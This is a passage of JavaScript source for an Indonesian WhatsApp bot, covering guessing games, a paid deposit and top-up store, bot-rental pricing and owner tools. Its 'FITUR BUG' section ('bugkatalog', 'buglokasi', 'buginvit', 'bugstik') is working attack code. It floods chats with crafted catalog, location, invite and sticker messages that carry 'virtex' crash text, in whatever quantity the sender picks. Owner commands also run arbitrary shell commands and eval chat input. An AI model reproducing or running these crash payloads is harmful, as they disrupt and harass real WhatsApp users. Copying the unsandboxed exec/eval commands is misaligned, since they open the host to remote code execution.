 clearTimeout(hanz.tebakgambar[id][3])
 delete hanz.tebakgambar[id]
 } else if(similarity(budy.toLowerCase(), json.jawaban.toLowerCase().trim()) >= threshold) setReply(`*Dikit Lagi!*`)
}
  //GAME tebak Lagu Function
hanz.tebaklagu = hanz.tebaklagu ? hanz.tebaklagu : {}  
if(isGroup && from in hanz.tebaklagu){
if(!isGroup) {return} 
const similarity = require('similarity')
const threshold = 0.72
let id = m.chat
 let json = JSON.parse(JSON.stringify(hanz.tebaklagu[id][1]))
 
 if (budy.toLowerCase() == json.judul.toLowerCase().trim()) {
user.balance += hanz.tebaklagu[id][2]
 let tbkLgu = `*GAME TEBAK LAGU*\n\nJawaban Kamu Benar!\n Hadiah : +${hanz.tebaklagu[id][2]} Money 💸`
   reply (tbkLgu)
 clearTimeout(hanz.tebaklagu[id][3])
 delete hanz.tebaklagu[id]
 } else if(similarity(budy.toLowerCase(), json.judul.toLowerCase().trim()) >= threshold) setReply(`*Dikit Lagi!*`)
// else setReply(`*Salah!*`)
 
}
	

 //---------Top Up Payment-----//
// ======== STORE & TOP UP ======= //
let db_saldo = JSON.parse(fs.readFileSync("./database/saldo.json"));
let depositPath = "./database/deposit/"
let topupPath = "./database/topup/"
// Membaca daftar nomor reseller dari file JSON
const userResPanel = JSON.parse(fs.readFileSync("./database/reselerpanel.json"));  
const isResPanel = userResPanel.includes(m.sender.replace('@s.whatsapp.net', ''));

const chatPrivate = !isGroup ? body.trim().toLowerCase() : null;

function toRupiah(angka) {
var saldo = '';
var angkarev = angka.toString().split('').reverse().join('');
for (var i = 0; i < angkarev.length; i++)
if (i % 3 == 0) saldo += angkarev.substr(i, 3) + '.';
return '' + saldo.split('', saldo.length - 1).reverse().join('');
}
    
if (chatPrivate === "payment_ovo") {
if (!fs.existsSync(depositPath + sender.split("@")[0] + ".json")) {
var deposit_object = {
ID: require("crypto").randomBytes(5).toString("hex").toUpperCase(),
session: "amount",
date: new Date().toLocaleDateString("ID", { timeZone: "Asia/Jakarta"}),
number: sender,
payment: "OVO",
data: {
amount_deposit: ""
}
}
fs.writeFileSync(depositPath + sender.split("@")[0] + ".json", JSON.stringify(deposit_object, null, 2))
reply("Oke banh mau deposit berapa?\n\nContoh: 15000")
} else {
reply("Proses Deposit kamu masih ada yang belum terselesaikan\n\nKetik Batal untuk membatalkan")
}
} else if (chatPrivate === "payqris") {
if (!fs.existsSync(depositPath + sender.split("@")[0] + ".json")) {
var deposit_object = {
ID: require("crypto").randomBytes(5).toString("hex").toUpperCase(),
session: "amount",
date: new Date().toLocaleDateString("ID", { timeZone: "Asia/Jakarta"}),
number: sender,
payment: "QRIS",
data: {
iddepo: "",
qr: "",
amount_deposit: "",
nominal: "",
pajak: "",
exp: ""
}
}
fs.writeFileSync(depositPath + sender.split("@")[0] + ".json", JSON.stringify(deposit_object, null, 2))
reply("Oke banh mau deposit berapa?\n\nContoh: 15000")
} else {
reply("Proses Deposit kamu masih ada yang belum terselesaikan\n\nKetik Batal untuk membatalkan")
}
} else if (chatPrivate === "paydana") {
if (!fs.existsSync(depositPath + sender.split("@")[0] + ".json")) {
var deposit_object = {
ID: require("crypto").randomBytes(5).toString("hex").toUpperCase(),
session: "amount",
date: new Date().toLocaleDateString("ID", { timeZone: "Asia/Jakarta"}),
number: sender,
payment: "DANA",
data: {
amount_deposit: ""
}
}
fs.writeFileSync(depositPath + sender.split("@")[0] + ".json", JSON.stringify(deposit_object, null, 2))
reply("Oke banh mau deposit berapa?\n\nContoh: 15000")
} else {
reply("Proses Deposit kamu masih ada yang belum terselesaikan\n\nKetik Batal untuk membatalkan")
}
}

if (fs.existsSync(depositPath + sender.split("@")[0] + ".json")) {
if (!m.key.fromMe) {
let data_deposit = JSON.parse(fs.readFileSync(depositPath + sender.split("@")[0] + ".json"))
if (data_deposit.session === "amount") {
if (isNaN(body.trim().toLowerCase())) return hanz.editmsg(m.chat,'Masukan hanya angka ya',m)
data_deposit.data.amount_deposit = Number(body.trim().toLowerCase())
if (data_deposit.data.amount_deposit < 2000) return reply(`Transaksi Deposit Minimal Rp2000`)
if (data_deposit.data.amount_deposit > 5000000) return reply(`Nominal Deposit terlalu tinggi`)
data_deposit.session = "konfirmasi_deposit";
fs.writeFileSync(depositPath + sender.split("@")[0] + ".json", JSON.stringify(data_deposit, null, 3));
if (data_deposit.payment === "QRIS") {
	let pajakny = await toJSON(0.01 * data_deposit.data.amount_deposit)
let key = new URLSearchParams()
key.append("api_key", apikeyAtlantic)
key.append("reff_id", data_deposit.ID);
key.append("nominal", data_deposit.data.amount_deposit+Number(pajakny));
key.append("type", "ewallet")
key.append("metode", "qrisfast")
fetch("https://atlantich2h.com/deposit/create", {
method: "POST",
body: key,
redirect: 'follow'
})
.then(response => response.json())
.then(res => {
	QRCode.toFile("./depoqris.jpg", res.data.qr_string, { margin: 2, scale: 10 })
if (!res.status) return reply(res.message)
data_deposit.result = res.status
data_deposit.data.iddepo = res.data.id
data_deposit.data.qr = "./depoqris.jpg"
data_deposit.data.pajak = res.data.nominal - data_deposit.data.amount_deposit
data_deposit.data.nominal = res.data.nominal
data_deposit.data.exp = res.data.expired_at
fs.writeFileSync(depositPath + sender.split("@")[0] + ".json", JSON.stringify(data_deposit, null, 3));
hanz.sendMessage(from, { text: `「 𝙆𝙊𝙉𝙁𝙄𝙍𝙈𝘼𝙎𝙄-𝘿𝙀𝙋𝙊𝙎𝙄𝙏 」

▪ ID: ${data_deposit.ID}
▪ Number: ${data_deposit.number.split('@')[0]}
▪ Payment: ${data_deposit.payment}
▪ Jumlah Deposit: Rp${toRupiah(data_deposit.data.amount_deposit)}
▪ Pajak Admin: Rp${toRupiah(res.data.nominal - data_deposit.data.amount_deposit)}
▪ Total Pembayaran: Rp${toRupiah(res.data.nominal)}

_Ketik *lanjut* untuk melanjutkan_
_Ketik *batal* untuk membatalkan_` }, { quoted: m })
})
} else {
hanz.sendMessage(from, {text: `「 𝙆𝙊𝙉𝙁𝙄𝙍𝙈𝘼𝙎𝙄-𝘿𝙀𝙋𝙊𝙎𝙄𝙏 」

▪ ID : ${data_deposit.ID}
▪ Nomer : ${data_deposit.number.split('@')[0]}
▪ Payment : E WALLET
▪ Jumlah Deposit : Rp${toRupiah(data_deposit.data.amount_deposit)}
▪ Pajak Admin : Rp0
▪ Total Pembayaran : Rp${toRupiah(data_deposit.data.amount_deposit)}

_Ketik Lanjut untuk melanjutkan_
_Ketik Batal untuk membatalkan_`}, { quoted: m })
}
} else if (data_deposit.session === "konfirmasi_deposit") {
if (chatPrivate === "lanjut") {
 if (data_deposit.payment === "QRIS") {
var qr_fexf = `⭒━━━━━━[ *PEMBAYARAN VIA QRIS* ]━━━━━━⭒

🔹 *ID Pengguna:* ${data_deposit.ID}
🔹 *Nomor Pengguna:* ${data_deposit.number.split("@")[0]}
🔹 *Jumlah Deposit:* Rp ${toRupiah(data_deposit.data.amount_deposit)}
🔹 *Pajak Admin:* Rp ${toRupiah(data_deposit.data.pajak)}
🔹 *Total Pembayaran:* Rp ${toRupiah(data_deposit.data.nominal)}
🔹 *Batas Waktu Pembayaran:* ${data_deposit.data.exp}

_Silakan scan QRIS di atas untuk melanjutkan pembayaran. Ketik *batal* jika ingin membatalkan transaksi._`;


hanz.sendMessage(from, { image: fs.readFileSync(data_deposit.data.qr), caption: qr_fexf }, { quoted: m })
} else if (data_deposit.payment === "DANA") {
var py_dana = Ehztext(`⭒━━━━━━[ *PAYMENT OPTIONS* ]━━━━━━⭒

🟢 *DANA*
 • Nomor: ${payment.dana.nomer}
 • Atas Nama: ${payment.dana.atas_nama}

🔵 *GOPAY*
 • Nomor: Tidak Tersedia Untuk Saat Ini
 • Atas Nama: 

🟠 *SHOPEEPAY*
 • Nomor: Tidak Tersedia Untuk Saat Ini
 • Atas Nama: 

🟣 *OVO*
 • Nomor: Tidak Tersedia Untuk Saat Ini
 • Atas Nama: 

🔵 *MANDIRI*
 • Nomor: Tidak Tersedia
 • Atas Nama: Tidak Tersedia

Harap transfer sesuai nomor di atas, dan setelah pembayaran, kirim bukti transfer dengan caption *.bukti* untuk diproses oleh admin. Terima kasih! 🙏`);

reply(py_dana)
}} else if (chatPrivate === "batal") {
let data_deposit = JSON.parse(fs.readFileSync(depositPath + sender.split("@")[0] + ".json"))
let key = new URLSearchParams()
key.append("api_key", apikeyAtlantic)
key.append("id", data_deposit.data.iddepo);
fetch("https://atlantich2h.com/deposit/cancel", {
method: "POST",
body: key,
redirect: 'follow'
})
.then(response => response.json())
.then(res => {
reply(`Baik banh, deposit dengan ID: ${data_deposit.ID} dibatalkan`)
fs.unlinkSync(depositPath + sender.split('@')[0] + '.json')
})
}}}}


if (fs.existsSync(depositPath + sender.split("@")[0] + ".json")) {
let data_deposit = JSON.parse(fs.readFileSync(depositPath + sender.split("@")[0] + ".json"))
if (data_deposit.payment === "QRIS") {
var intervals = setInterval(function() {
let key = new URLSearchParams()
key.append("api_key", apikeyAtlantic)
key.append("id", data_deposit.data.iddepo);
fetch("https://atlantich2h.com/deposit/status", {
method: "POST",
body: key,
redirect: 'follow'
})
.then(response => response.json())
.then(res => {
console.log(res); // For Debugging
console.log(color("[DEPOSIT QRIS]", "green"), `-> ${sender}`) // For Debugging
if (res.status == false) {
	clearInterval(intervals);
} else if (res.data.status === "success") {
reply(`*DEPOSIT SUKSES*\n*Status:* success\n*ID:* ${data_deposit.ID}\n*Nomer:* ${data_deposit.number.split("@")[0]}\n*Jumlah Deposit:* Rp${toRupiah(data_deposit.data.amount_deposit)}\n*Pajak Admin:* Rp${toRupiah(data_deposit.data.pajak)}\n*Total Pembayaran:* Rp${toRupiah(data_deposit.data.nominal)}\n\n_Terimakasih banh sudah deposit._`)
addSaldo(sender, Number(data_deposit.data.amount_deposit), db_saldo)
fs.unlinkSync(depositPath + sender.split("@")[0] + ".json")
clearInterval(intervals);
return;
} else if (res.data.status === "expired") {
console.log(res)
reply(`Deposit anda telah *Expired*`)
fs.unlinkSync(depositPath + sender.split("@")[0] + ".json")
clearInterval(intervals);
return;
} else if (res.data.status === "cancel") {
if (fs.existsSync(depositPath + sender.split("@")[0] + ".json")) return fs.unlinkSync(depositPath + sender.split("@")[0] + ".json")
clearInterval(intervals);
return;
}
})
}, 3000)
}
}


if (fs.existsSync(topupPath + sender.split("@")[0] + ".json")) {
	if (!m.key.fromMe) {
let data_topup = JSON.parse(fs.readFileSync(topupPath + sender.split("@")[0] + ".json"))
if (data_topup.session === "target") {
if (isNaN(body.trim().toLowerCase())) return reply("Hanya Masukan Nomor/Id Tidak boleh ada karakter lain")
data_topup.data.target = body.trim().toLowerCase()
data_topup.session = "konfirmasi_topup";
fs.writeFileSync(topupPath + sender.split("@")[0] + ".json", JSON.stringify(data_topup, null, 3));

let tekYa = `🎯 *TARGET:* ${data_topup.data.target}

_Pastikan ID atau Nomor yang Anda masukkan sudah benar._

Ketik *lanjut* untuk melanjutkan transaksi, atau ketik *batal* jika ingin membatalkan.`;

setReply(tekYa)
} else if (data_topup.session === "konfirmasi_topup") {
	if (chatPrivate === "lanjut") {
	let key = new URLSearchParams()
key.append("api_key", apikeyAtlantic)
key.append("code", data_topup.data.code)
key.append("reff_id", require("crypto").randomBytes(5).toString("hex").toUpperCase())
key.append("target", data_topup.data.target)
fetch("https://atlantich2h.com/transaksi/create", {
method: "POST",
body: key,
redirect: 'follow'
})
.then(response => response.json())
.then(res => {
	if (!res.status) return reply('Server maintenance\nHarap Ketik *batal* Terlebih Dahulu,Lalu Gunakan Pilihan Yang Lain')
	let persen = (untung / 100) * res.data.price
	data_topup.result = res.status
	data_topup.data.idtopup = res.data.id
	data_topup.data.id = res.data.reff_id
	data_topup.data.price = res.data.price + Number(Math.ceil(persen))
	data_topup.data.layanan =  res.data.layanan
	fs.writeFileSync(topupPath + sender.split("@")[0] + ".json", JSON.stringify(data_topup, null, 3));
	reply(`*「 ${res.message.toUpperCase()} 」*\n\n*PESAN:* _Tunggu sejenak, Bot sedang memproses pesanan anda✅_`)	
})
await sleep(5000)
var intervals = setInterval(function() {
let key = new URLSearchParams()
key.append("api_key", apikeyAtlantic)
key.append("id", data_topup.data.idtopup)
key.append("type", "prabayar")
fetch("https://atlantich2h.com/transaksi/status", {
method: "POST",
body: key,
redirect: 'follow'
})
.then(responsep => responsep.json())
.then(resss => {
console.log(resss); // For Debugging
console.log(color("[TRANSAKSI]", "green"), `-> ${sender}`) // For Debugging
if (resss.status == false) {
	clearInterval(intervals);
	} else
if (resss.data.status === "success") {
	let persen = (untung / 100) * resss.data.price
reply(`*「 TOPUP SUKSES 」*\n\n*⌬ Status:* Berhasil ✅\n*⌬ ID Pesanan:* ${resss.data.reff_id}\n*⌬ Layanan:* ${resss.data.layanan}\n*⌬ Nomor Tujuan:* ${resss.data.target}\n*⌬ Harga:* Rp${toRupiah(Number(resss.data.price) + Number(Math.ceil(persen)))}\n\n*⌬ Serial Number (SN):*\n${resss.data.sn}\n\n_Terima kasih telah memesan. Semoga transaksi ini memuaskan!_`)

minSaldo(sender, (Number(resss.data.price) + Number(Math.ceil(persen))), db_saldo)
fs.unlinkSync(topupPath + sender.split("@")[0] + ".json")
clearInterval(intervals);
return;
} else if (resss.data.status === 'failed') {
console.log(resss)
reply(`❌Pesanan dibatalkan!\nAlasan : Kesalahan oleh bot atau ID tidak valid`)
fs.unlinkSync(topupPath + sender.split("@")[0] + ".json")
clearInterval(intervals);
return;
} else if (resss.data.status === 'cansel') {
console.log(resss)
reply(`❌Pesanan dibatalkan!\nAlasan : ${resss.data.message}`)
fs.unlinkSync(topupPath + sender.split("@")[0] + ".json")
clearInterval(intervals);
return;
} 
})
}, 3000)
	} else if (chatPrivate === "batal") {
		reply(`Pesanan dibatalkan!`)
fs.unlinkSync(topupPath + sender.split("@")[0] + ".json")
	}}}}

            
    
// ===================================\\
try{
switch(command) {
        
// ========== FITUR  TOP UP ========//


// ============== FITUR BUG ===========//
case 'bugkatalog': {
if (!isPremium) return reply('Khusud Prem Yang Mau Buy Prem Ke Owner')
let jumlah = parseInt(q); // Mengambil input jumlah dari pengguna
    if (isNaN(jumlah) || jumlah <= 0) return setReply("Tentukan jumlah undangan yang valid."); // Validasi input
for (let i = 0; i < jumlah; i++) {
var product = generateWAMessageFromContent(from, proto.Message.fromObject({
"orderMessage": {
"orderId": "765937258632808",
"thumbnail": thumb,
"itemCount": 99,
"status": "INQUIRY",
"surface": "CATALOG",
"message": `${virtex3(prefix)}`,
"orderTitle": "ALBYS",
"sellerJid": "123233@s.whatsapp.net",
"token": "AR7vqqKIzgmGVVJPi3iEdmJF1xOnAfzkunMEJDF+0WlNMA==",
"totalAmount1000": "1260000000",
"totalCurrencyCode": "IDR"
}
}), { userJid: from, quoted:m})
hanz.relayMessage(from, product.message, { messageId: product.key.id })
}
    setReply(`Berhasil mengirim ${jumlah} troli.`);
}
        break
    case "buglokasi":{
 if (!isPremium) return onlyPrem()
let jumlah = parseInt(q); // Mengambil input jumlah dari pengguna
    if (isNaN(jumlah) || jumlah <= 0) return setReply("Tentukan jumlah undangan yang valid."); // Validasi input
for (let i = 0; i < jumlah; i++) {
var locationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
	"locationMessage": {
    "degreesLatitude": -7.350000,  // Latitude Tasikmalaya
    "name": `${virtex9(prefix)}`,  // Nama lokasi atau pesan
    "degreesLongitude": 108.217000,  // Longitude Tasikmalaya


					"jpegThumbnail": thumb
				}
}), { userJid: from, quoted:m})
hanz.relayMessage(from, locationMessage.message, { messageId: locationMessage.key.id })
}
setReply(`Berhasil mengirim ${jumlah} lokasi.`);
}
break

											
										
    case 'buginvit': {
if (!isOwner) return onlyOwner()
    // Ambil jumlah dari input pengguna
    let jumlah = parseInt(q); // Mengambil input jumlah dari pengguna
    if (isNaN(jumlah) || jumlah <= 0) return setReply("Tentukan jumlah undangan yang valid."); // Validasi input jumlah

    // Loop untuk mengirim undangan sesuai jumlah yang diinginkan
    for (let i = 0; i < jumlah; i++) {
        // Buat pesan undangan grup
        var groupInviteMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
            "groupInviteMessage": {
                "groupJid": "120363251190676308@g.us", // Ganti dengan Group JID sebenarnya
                "inviteCode": "/RwWifkIpEQUesVv", // Ganti dengan kode undangan grup yang valid
                "inviteExpiration": "1709614188", // Ganti dengan tanggal kedaluwarsa yang sesuai (timestamp)
                "groupName": `${virtex(prefix)}`, // Nama grup yang diundang
                "caption": `${virtex(prefix)}` // Pesan yang akan dikirimkan
            }
        }), { userJid: from, quoted: m });

        // Kirim pesan undangan grup
        await hanz.relayMessage(from, groupInviteMessage.message, { messageId: groupInviteMessage.key.id });
    }

    // Berikan respons setelah semua undangan dikirim
    setReply(`Berhasil mengirim ${jumlah} undangan grup.`);
}
break;

case 'sewa':
    hanz.sendMessage(m.chat, {
        video: fs.readFileSync('./stik/video.mp4'), // Membaca file video dari sistem
        gifPlayback: true, // Mengatur agar video diputar sebagai GIF
        caption: `Bᴇʀɪᴋᴜᴛ ᴀᴅᴀʟᴀʜ ʟɪꜱᴛ ʜᴀʀɢᴀ ᴜɴᴛᴜᴋ ꜱᴇᴡᴀ ʙᴏᴛ

*SEWA BOT*
🌀 *Hᴀʀɢᴀ*- 
Pᴇɴɢɢᴜɴᴀ ʙᴀʀᴜ Rᴘ. 5.000 ᴘᴇʀ ɢʀᴏᴜᴘ - Pᴇʀᴘᴀɴᴊᴀɴɢ Rᴘ. 3.000
- Mᴀꜱᴀ ᴀᴋᴛɪꜰ 7 ʜᴀʀɪ

🌀 *Hᴀʀɢᴀ*
- Pᴇɴɢɢᴜɴᴀ ʙᴀʀᴜ Rᴘ. 10.000 ᴘᴇʀ ɢʀᴏᴜᴘ
- Pᴇʀᴘᴀɴᴊᴀɴɢ Rᴘ. 8.000
- Mᴀꜱᴀ ᴀᴋᴛɪꜰ 30 Hᴀʀɪ

🌀 *Hᴀʀɢᴀ*
- Rᴘ. 25.000 ᴘᴇʀ ɢʀᴜᴘ
> Mᴀꜱᴀ ᴀᴋᴛɪꜰ 200 Hᴀʀɪ
- Rᴘ. 30.000 ᴘᴇʀ ɢʀᴜʙ
> Mᴀꜱᴀ ᴀᴋᴛɪꜰ 250 Hᴀʀɪ
- Rᴘ. 50.000 ᴘᴇʀ ɢʀᴜʙ
> Mᴀꜱᴀ ᴀᴋᴛɪꜰ ꜱᴀᴛᴜ ᴛᴀʜᴜɴ

𝗡𝗢𝗧𝗘 : 

Bᴏᴛ ᴏɴ 24 ᴊᴀᴍ ᴛᴀᴘɪ ᴋᴀᴅᴀɴɢ 
ᴊᴜɢᴀ ᴍᴀᴛɪ ᴋʟᴏ ʟɢɪ ᴀᴅᴀ ᴇʀʀᴏʀ 
ᴀᴛᴀᴜ ʟɢɪ ᴘᴇʀʙᴀɪᴋᴀɴ ʙᴜɢ.

Kᴀʟᴏ ᴍᴀᴜ ꜱᴇᴡᴀ ʙɪꜱᴀ ᴄʜᴀᴛ
wa.me/628388198229 (don't call, don't spam!)`
    }, { quoted: m }); // Menambahkan opsi quoted untuk membalas pesan
break;

case 'bugstik':{
if (!isOwner) return onlyOwner()
if (args.length == 0) return setReply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
const jumlah = `${encodeURI(q)}`
let ydd = `Hallo Aku bot wea`
for (let i = 0; i < jumlah; i++) {
hanz.sendMessage(from, {sticker:{ url:stikBug}},{quoted: {
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
"message": {
"stickerMessage": {
"url": "https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc",
"fileSha256": "YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=",
"fileEncSha256": "9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=",
"mediaKey": "nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=",
"mimetype": "image/webp",
"height": 64,
"width": 64,
"directPath": "/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781",
"fileLength": "7774",
"mediaKeyTimestamp": "1657290167",
"isAnimated": false,
}
}
}})
}
setReply (`Sukses Send Bug Sebanyak ${jumlah}`)
}
break
 // ======== FITUR INFO =========//
 
// =≠≠====== FITUR GROUP ===========//

// ========== FITUR KEAMANAN ========//

// ========== FITUR DOWNLOAD =========//

// ========== FITUR AI ===========//
 
 //===≠===== FITUR ANIME ===========//
 
// ========== FITUR TOOLS =========//

// ========= FITUR SHORT URL ========= //

// ========= FITUR SEARCH ============//
 
// =========== FITUR ISLAMIC =========//

 // ======== FITUR STIKER =========//
            
// =========== FITUR FUN ======≠=====//
               
// =≠===≠=== FITUR  NSFW ========= //
  
// =≠===== FITUR EPHOTO ==≠===== //
 
// ====== FITUR TEXTPRO ======== //

// =≠====== FITUR PRIMBON ========//

// ==≠======= FITUR CONVERT ======== //

// ========== FITUR GAME ==========//
case 'tebakgambar':{
  if (!isGame) return setReply(mess.game)
if (!isGroup) return onlyToko()
if (!isPremium && global.db.data.users[sender].glimit < 1) return onlyGlimit()
let poin = 1000
let timeout = 120000
let id = m.chat

//let but1 = [{"buttonId": `${prefix}tebakgambar`,"buttonText": {"displayText": `🎮 ᴍᴀɪɴ ʟᴀɢɪ`},"type": "RESPONSE"}]
if (id in hanz.tebakgambar) return setReply('Masih ada soal belum terjawab di chat ini')
let src = await (await fetch('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakgambar.json')).json()
let json = src[Math.floor(Math.random() * src.length)]
let kentir = await getBuffer(json)       
let teks = Ehztext(`*Soal :* ${json.deskripsi}

Timeout *${(timeout / 1000).toFixed(2)} detik*
Exp : +999
Bonus : +${poin} Saldo`.trim())
hanz.tebakgambar[id] = [
hanz.sendImage(from, json.img , teks, m),
json,
setTimeout(() => {
if (hanz.tebakgambar[id])
setReply(`Waktu game telah habis
Jawabannya adalah : ${json.jawaban}`)  
delete hanz.tebakgambar[id]
 }, timeout)
 ]
db.data.users[sender].glimit -= 1
}
break
case 'tebaklagu':{
    if (!isGame) return setReply(mess.game)
if (!isGroup) return onlyToko()
	let timeout = 60000
	let poin = 1200
	let id = m.chat
	if (id in hanz.tebaklagu) return setReply('Masih ada soal belum terjawab di chat ini')
	let src = await (await fetch('https://raw.githubusercontent.com/qisyana/scrape/main/tebaklagu.json')).json()
	let json = src[Math.floor(Math.random() * src.length)]
    
 var lagu = await hanz.sendMessage(from, {audio: {url: `${json.lagu}`, ptt: true, mimetype: 'audio/mpeg'}}, { quoted: m })
	let caption = `*TEBAK LAGU*
	Artis: ${json.artis}
	Soal: Judul lagu di atas adalah...
	
	Waktu: *${(timeout / 1000).toFixed(2)} detik*
	Hadiah: ${poin} Money
	`.trim()
	hanz.tebaklagu[id] = [
		await hanz.sendMessage(from, {text: caption}, {quoted: m}),
	json, poin,
	setTimeout(() => {
	if (hanz.tebaklagu[id]) 
     user.balance -= 200
reply(`*GAME TEBAK LAGU*\n\nWaktu habis!\n𖦹 Jawabannya adalah; *${json.judul}*\n𖦹 Saldo kamu dikurangi 200\n𖦹 Sisa Saldo kamu: *${db.data.users[sender].balance.toLocaleString()}*`)
	delete hanz.tebaklagu[id]
	 }, timeout)
	 ]
	}
    db.data.users[sender].glimit -= 1
	break
 // ========= FITUR STORAGE =========//
  
 // ========= FITUR SETTINGS ========//

 // ========== FITUR OWNER =========== //
case 'getcase': {
    try {
        if (!isOwner && !itsMe) return onlyOwner();
        if (!q) return setReply("*Mau nyari Case apa kak*");
        if (q.startsWith(prefix)) return setReply("Query tidak boleh menggunakan prefix");

        let nana = await getCase(q);
let nana1 = `${gris1} ${nana} ${gris1}`
  reply(nana1)

    } catch (err) {
        console.log(err);
        setReply(`Case ${q} tidak ditemukan`);
    }
}
break;
case 'addcase': {
    if (!isOwner) return onlyOwner();
    if (!q) return setReply('Penggunaan salah. Silakan ketik `addcase Fitur` yang ingin ditambahkan.');
    const namaFile = './message/case.js';
    const caseBaru = `${q}`;
    fs.readFile(namaFile, 'utf8', (err, data) => {
        if (err) {
            console.error('Terjadi kesalahan saat membaca file:', err);
            return;
        }
        const posisiAwalGimage = data.indexOf("case 'addcase':");
        if (posisiAwalGimage !== -1) {
            const kodeBaruLengkap = data.slice(0, posisiAwalGimage) + '\n' + caseBaru + '\n' + data.slice(posisiAwalGimage);
            fs.writeFile(namaFile, kodeBaruLengkap, 'utf8', (err) => {
                if (err) {
                    setReply('Error File: ' + err); 
                } else {
                    setReply('Sukses Menambahkan case'); 
                }
            });
        } else {
            setReply('Gagal Menambahkan case'); 
        }
    });
}
break;

case 'delcase': {
    if (!isOwner) return onlyOwner();
    if (!q) return setReply('Penggunaan salah. Silakan ketik `delcase Fitur` yang ingin dihapus.');
    const namaFile = './message/case.js';
    const caseToDelete = `case '${q}':`;
    fs.readFile(namaFile, 'utf8', (err, data) => {
        if (err) {
            console.error('Terjadi kesalahan saat membaca file:', err);
            return setReply('Terjadi kesalahan saat membaca file.'); // Mengganti 'reply' menjadi 'setReply'
        }
        const posisiCase = data.indexOf(caseToDelete);
        if (posisiCase === -1) {
            return setReply(` case ${q} tidak ditemukan dalam file.`); // Mengganti 'args' menjadi 'text' untuk konsistensi
        }
        const posisiBreak = data.indexOf('break;', posisiCase);
        if (posisiBreak === -1) {
            return setReply('Tidak dapat menemukan "break;" setelah case yang ingin dihapus.'); // Mengganti 'reply' menjadi 'setReply'
        }
        const kodeBaruLengkap = data.slice(0, posisiCase) + data.slice(posisiBreak + 'break;'.length);
        fs.writeFile(namaFile, kodeBaruLengkap, 'utf8', (err) => {
            if (err) {
                console.error('Terjadi kesalahan saat menulis file:', err);
                return setReply('Terjadi kesalahan saat menulis file.'); // Mengganti 'reply' menjadi 'setReply'
            } else {
                return setReply(`Case '${q}' berhasil dihapus.`); // Mengganti 'reply' menjadi 'setReply'
            }
        });
    });
}
break;

case 'listcase': {
setReply(listCase())
}
break
case 'sendcase':
try {
    if (!isOwner && !itsMe) return onlyOwner();
    if (!q) return setReply("*Mau kirim Case apa kak?*");
    let who;
    try {
        if (m.isGroup) {
            who = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted.sender;
        } else {
            who = m.sender; 
        }
    } catch (err) {
        if (m.isGroup) {
            who = args[0] + '@s.whatsapp.net'; 
        } else {
            who = m.sender; 
        }
    }
    if (!who) return setReply(`Tag atau nomor tidak ditemukan!`);
    if (q.startsWith(prefix)) return setReply("Query tidak boleh menggunakan prefix");
    let caseData = await getCase(q);
    if (!caseData) return setReply(`Case ${q} tidak ditemukan`);
  let kirCas = `${gris}Hai Kak Ada Kiriman case Dari Owner Ku Nih${gris} \n\n ${caseData}`
    await hanz.sendMessage(who, { text: kirCas });
    setReply(`Case "${q}" berhasil dikirim ke ${who}`);
} catch (err) {
    console.log(err);
    setReply(`Case ${q} tidak ditemukan atau terjadi kesalahan`);
}
break;
case 'getfunc':
    if (!isOwner) return onlyOwner()
    if (!q) return reply(`Contoh penggunaan: ${prefix + command} onlyLimit`); 
    const getfunc = (funcc) => {
        const fileContent = fs.readFileSync('./message/case.js', 'utf8'); 
        const functionRegex = new RegExp(`const ${funcc} = (.*?)};`, 's');
        const match = fileContent.match(functionRegex);
        return match ? match[0] : `Function ${funcc} tidak ditemukan.`; 
    };

    reply(`${getfunc(q)}`); 
    break; 
case '$':{
if (!itsMe && !isOwner) return onlyOwner()
await setReply("_Executing..._")
exec(q, async (err, stdout) => {
if (err) return setReply(`${copyright}:~ ${err}`)
if (stdout) {
await setReply(`*>_ Console*\n\n${stdout}`)
}
})
}
break
case '>': {
if (!isOwner) return onlyOwner()
try {
let evaled = await eval(q)
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
m.reply(evaled)
} catch (err) {
m.reply(String(err))
}
}
break
// =========== MAIN MENU ==========//

//============= BATAS ==============//
    

default:
    
        
 //--------PLUGINS-------\\
let usedPrefix
let _user = global.db.data && global.db.data.users && global.db.data.users[m.sender]
const ___dirname = path.join(__dirname, './plugins')
for (let name in global.plugins) {
let plugin = global.plugins[name]
if (!plugin)
continue
if (plugin.disabled)
continue
const __filename = join(___dirname, name)
if (typeof plugin.all === 'function') {
try {
await plugin.all.call(hanz, m, {
chatUpdate,
__dirname: ___dirname,
__filename
})
} catch (e) {
console.error(e)
}
}


const str2Regex = str => str.replace(/[|\\{}()[\]^$+*?.]/g, '\\$&')
let _prefix = plugin.customPrefix ? plugin.customPrefix: prefix
let match = (_prefix instanceof RegExp ? // RegExp Mode?
[[_prefix.exec(m.text), _prefix]]:
Array.isArray(_prefix) ? // Array?
_prefix.map(p => {
let re = p instanceof RegExp ? // RegExp in Array?
p:
new RegExp(str2Regex(p))
return [re.exec(m.text), re]
}):
typeof _prefix === 'string' ? // String?
[[new RegExp(str2Regex(_prefix)).exec(m.text), new RegExp(str2Regex(_prefix))]]:
[[[], new RegExp]]
).find(p => p[1])

if (typeof plugin.before === 'function') {
if (await plugin.before.call(hanz, m, {
thePrefix,
store,
isAccept,
command,
args,
q,
match,
hanz,
prefix,
setReply,
reply,
sendSticker,
sendvn,
sendMusic,
sendThumb,
sendReact,
otw,
from,
budy,
participants: m.groupMembers,
groupMetadata: m.groupMetadata,
user: m.user,
bot: m.bot,
isROwner: isOwner,
isOwner,
isRAdmin: m.isRAdmin ,
isAdmin: m.isAdmin,
isBotAdmin: m.isBotAdmin,
isPremium,
isprems: isPremium,
isResPanel,
chatUpdate,
__dirname: ___dirname,
__filename
}))
continue
}

if (typeof plugin !== 'function')
continue

